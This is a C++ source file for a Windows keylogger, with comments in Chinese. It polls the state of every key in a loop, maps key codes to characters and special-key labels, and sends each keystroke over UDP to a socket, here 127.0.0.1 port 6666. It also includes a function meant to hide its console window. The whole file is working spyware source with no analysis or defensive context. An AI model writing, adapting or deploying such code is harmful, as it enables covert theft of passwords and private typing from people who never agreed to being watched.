#include <WINSOCK2.H>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <windows.h>
#include <ctime>
#include <time.h>
#include <string>
#include <ctype.h>
using namespace std;

void hide()
{
  HWND stealth; //宣告一個視窗控制(Handle of WiNDow)變數 stealth
  AllocConsole(); //配置一個新的控制台視窗
  stealth=FindWindowA("ConsoleWindowClass",NULL); //找尋最上層(新配置)的控制台視窗指派給stealth變數
  ShowWindow(stealth,5); //將控制台視窗的顯視狀態指定為隱藏(0) 顯示(5)
}

//儲存按鍵值

int save_key(int key_stroke)
{
    WSADATA wsaData;
    WORD versionRequired=MAKEWORD(1,1);
    WSAStartup(versionRequired,&wsaData);
    SOCKET sock_fd;
    SOCKADDR_IN  servaddr;
    string str1;
    const char *serverip = "127.0.0.1";
    short port = 6666;
    sock_fd = socket(PF_INET,SOCK_DGRAM,0);
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);
    servaddr.sin_addr.S_un.S_addr = inet_addr(serverip);


  bool bKeys = 1;
  bKeys=GetKeyState(VK_CAPITAL);

  switch(key_stroke)
  {
    //記錄特殊按鍵
    case   8: str1.assign("[BcakSpace]"); sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_BACK
    case   9: str1.assign("[Tab]");       sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_TAB
    case  13: str1.assign("[Enter]");     sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_ENTER
    case  16: str1.assign("[Shift]");     sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_SHIFT
    case  17: str1.assign("[Ctrl]");      sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_CONTROL
    case  27: str1.assign("[Esc]");       sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_ESCAPE
    case  32: str1.assign(" ");           sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_SPACE
    case  35: str1.assign("[End]");       sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_END
    case  36: str1.assign("[Home]");      sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_HOME
    case  37: str1.assign("[Left]");      sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_LEFT
    case  38: str1.assign("[Up]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_UP
    case  39: str1.assign("[Right]");     sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_RIGHT
    case  40: str1.assign("[Down]");      sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_DOWN
    case  20: str1.assign("[Caps Lock]"); sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_CAPITAL
    case 144: str1.assign("[Num Lock]");  sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMLOCK
    case 46: str1.assign("[Delete]");     sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMLOCK


    //F1-12
    case 112: str1.assign("[F1]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_F1
    case 113: str1.assign("[F2]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_F2
    case 114: str1.assign("[F3]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_F3
    case 115: str1.assign("[F4]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_F4
    case 116: str1.assign("[F5]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_F5
    case 117: str1.assign("[F6]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_F6
    case 118: str1.assign("[F7]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_F7
    case 119: str1.assign("[F8]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_F8
    case 120: str1.assign("[F9]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_F9
    case 121: str1.assign("[F10]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_F10
    case 122: str1.assign("[F11]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_F11
    case 123: str1.assign("[F12]");        sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_F12
    //記錄數字鍵盤
    case  48: if(GetKeyState(VK_SHIFT))str1.assign(")");else str1.assign("0");  sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break;
    case  96: str1.assign("0");           sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMPAD0
    case  49: if(GetKeyState(VK_SHIFT))str1.assign("!");else str1.assign("1");  sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break;
    case  97: str1.assign("1");           sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMPAD1
    case  50: if(GetKeyState(VK_SHIFT))str1.assign("@");else str1.assign("2");  sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMPAD0
    case  98: str1.assign("2");           sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMPAD2
    case  51: if(GetKeyState(VK_SHIFT))str1.assign("#");else str1.assign("3");  sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break;
    case  99: str1.assign("3");           sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMPAD3
    case  52: if(GetKeyState(VK_SHIFT))str1.assign("$");else str1.assign("4");  sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break;
    case 100: str1.assign("4");           sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMPAD4
    case  53: if(GetKeyState(VK_SHIFT))str1.assign("%");else str1.assign("5");  sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break;
    case 101: str1.assign("5");           sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMPAD5
    case  54: if(GetKeyState(VK_SHIFT))str1.assign("^");else str1.assign("6");  sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break;
    case 102: str1.assign("6");           sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMPAD6
    case  55: if(GetKeyState(VK_SHIFT))str1.assign("&");else str1.assign("7");  sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break;
    case 103: str1.assign("7");           sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMPAD7
    case  56: if(GetKeyState(VK_SHIFT))str1.assign("*");else str1.assign("8");  sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break;
    case 104: str1.assign("8");           sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMPAD8
    case  57: if(GetKeyState(VK_SHIFT))str1.assign("(");else str1.assign("9");  sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break;
    case 105: str1.assign("9");           sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_NUMPAD9
    case 110:                                                  //VK_OEM_PERIOD
    case 190: str1.assign(".");           sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr)); break; //VK_DECIMAL

    //英文字母大小寫
    default:
           if(bKeys==0 && key_stroke>=65 && key_stroke<=90 ) //a-z
           {
             key_stroke=key_stroke+32;
             str1.push_back((char)key_stroke);
             sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
           }
            else if(bKeys!=0 && key_stroke>=65 && key_stroke<=90) //A-Z
           {
             key_stroke=key_stroke;
             str1.push_back((char)key_stroke);
             sendto(sock_fd, str1.c_str(), str1.length(), 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
           }
  }

    closesocket(sock_fd);
  return 0;
}

int main()
{

  //讀出鍵盤狀態

  hide(); //呼叫 hide 自訂函數 (隱藏鍵盤側錄器)

  char i;
  string str;

  BYTE bKeys;

  //檢查虛擬鍵(數字鍵 Num Lock)是否開啟

  bKeys=GetKeyState(VK_NUMLOCK);

  if(bKeys)
  {
    str.assign("[Num lock 開啟中 ]\n");
  }

  //檢查虛擬鍵(大寫鍵 Caps Lock)是否開啟

  bKeys=GetKeyState(VK_CAPITAL);

  if(bKeys)
  {
    str.assign("[Caps lock 開啟中 ]\n");
  }

  while (1)
  {
    time_t firstSeconds,lastSeconds;

    lastSeconds=time(NULL);

    for(i=8;i<=190;i++)
    {
      firstSeconds=time(NULL);
      if(GetAsyncKeyState(i)==-32767) //按鍵放開傳回0x0 (0) 按鍵按下傳回0xffff8001 (-32767)
        save_key(i);
    }

    //代表一陣子鍵盤沒有輸入任何字串
    if(lastSeconds-firstSeconds>=10)
      str="\n\n";
  }

    WSACleanup();
    return 0;
}
